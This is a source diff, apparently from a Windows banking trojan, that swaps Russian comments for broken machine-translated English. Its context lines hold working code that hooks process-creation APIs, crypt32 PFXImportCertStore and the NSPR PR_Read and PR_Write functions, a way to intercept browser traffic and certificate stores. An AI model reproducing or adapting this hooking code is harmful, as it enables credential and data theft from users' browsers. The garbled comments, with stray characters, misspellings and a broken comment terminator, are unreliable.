@@ -49,7 +49,7 @@ static void setCreateProcessNotifyApi(HOOKWINAPI *hwa)
     hwa->functionForHook = coreData.ntdllApi.ntCreateUserProcess;
     hwa->hookerFunction  = CoreHook::hookerNtCreateUserProcess;
   }
-  else /*if(coreData.ntdllApi.ntCreateThread != NULL) //Обе функции не могут быть NULL, см. Core::init()*/
+  else /*if(coreData.ntdllApi.ntCreateThread != NULL) //Both functions can not be NULL, see the Core:: init () * /
   {
     hwa->functionForHook = coreData.ntdllApi.ntCreateThread;
     hwa->hookerFunction  = CoreHook::hookerNtCreateThread;
@@ -93,20 +93,18 @@ static void hotPatchCallback(const void *functionForHook, const void *originalFu
   Core::replaceFunction(functionForHook, originalFunction);
 }
 
-/*
-  Перехватывает все WinApi из списка
+/*В В Intercepts all WinApi list
 
-  IN process            - процесс.
-  IN OUT list           - список.
-  IN count              - кол. эелементов.
-  IN realCount          - кол. эелементов, должны быть равны. Смысл это понятен в коде.
+В В IN process - a process.
+В В IN OUT list - a list.
+В В IN count - count. eelementov.
+В В IN realCount - col. eelementov, should be equal. The meaning of this concept in the code.
 
-  Return                - true - если перехвачены все WinApi,
-                          false - если не перехвачена хотя бы одна WinAPI.
-*/
+В В Return - true - if all intercepted WinApi,
+В В В В В В В В В В В В В В В В В В В В В В В В В В false - if not caught at least one of WinAPI.*/
 static bool hookList(HANDLE process, HOOKWINAPI *list, DWORD count, DWORD realCount)
 {
-  //Страхуемся.
+  //Insured.
   if(count != realCount)
   {
 #   if defined WDEBUG2
@@ -115,7 +113,7 @@ static bool hookList(HANDLE process, HOOKWINAPI *list, DWORD count, DWORD realCo
     return false;
   }
 
-  //Обнуляем структуру на всякий случай.
+  //Zero out the structure just in case.
   for(DWORD i = 0; i < count; i++)
   {
     if(list[i].functionForHook == NULL)
@@ -132,7 +130,7 @@ static bool hookList(HANDLE process, HOOKWINAPI *list, DWORD count, DWORD realCo
   LPBYTE opcodesBuf = (LPBYTE)WaHook::_allocBuffer(process, count);
   if(opcodesBuf != NULL)
   {
-    //Ставим хуки.    
+    //Put the hooks.
     DWORD i = 0;
     for(; i < count; i++)
     {
@@ -153,16 +151,16 @@ static bool hookList(HANDLE process, HOOKWINAPI *list, DWORD count, DWORD realCo
 
     if(i == count)return true;
       
-    //Снимаем хуки.
+    //Remove hooks.
     unhookList(process, list, count);
   }
   
   return false;
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// Таблица перехвата для пользовательского процесса.
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//В Table interception for a custom process.
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 static HOOKWINAPI userHooks[] =
 {
   {NULL, NULL,                                          NULL, 0},
@@ -330,7 +328,7 @@ bool WinApiTables::_setUserHooks(void)
 
   userHooks[i++].functionForHook = CWA(crypt32, PFXImportCertStore);
 
-  //Хукаем.
+  //Hook.
   return hookList(CURRENT_PROCESS, userHooks, i, sizeof(userHooks) / sizeof(HOOKWINAPI));
 }
 
@@ -339,9 +337,9 @@ bool WinApiTables::_removeUserHooks(void)
   return unhookList(CURRENT_PROCESS, userHooks, sizeof(userHooks) / sizeof(HOOKWINAPI));
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// Таблица перехвата для nspr4.dll.
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//В Table interception nspr4.dll.
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 #if(BO_NSPR4 > 0)
 #define DLL_NSPR4 L"nspr4.dll"
@@ -374,7 +372,7 @@ bool WinApiTables::_setNspr4Hooks(HMODULE nspr4Handle)
   nspr4Hooks[i++].functionForHook = CWA(kernel, GetProcAddress)(nspr4Handle, "PR_Read");
   nspr4Hooks[i++].functionForHook = CWA(kernel, GetProcAddress)(nspr4Handle, "PR_Write");
 
-  //Хукаем.
+  //Hook.
   bool ok = hookList(CURRENT_PROCESS, nspr4Hooks, i, sizeof(nspr4Hooks) / sizeof(HOOKWINAPI));
   if(ok)Nspr4Hook::updateAddresses(nspr4Handle, nspr4Hooks[0].originalFunction, nspr4Hooks[1].originalFunction, nspr4Hooks[2].originalFunction, nspr4Hooks[3].originalFunction);
 
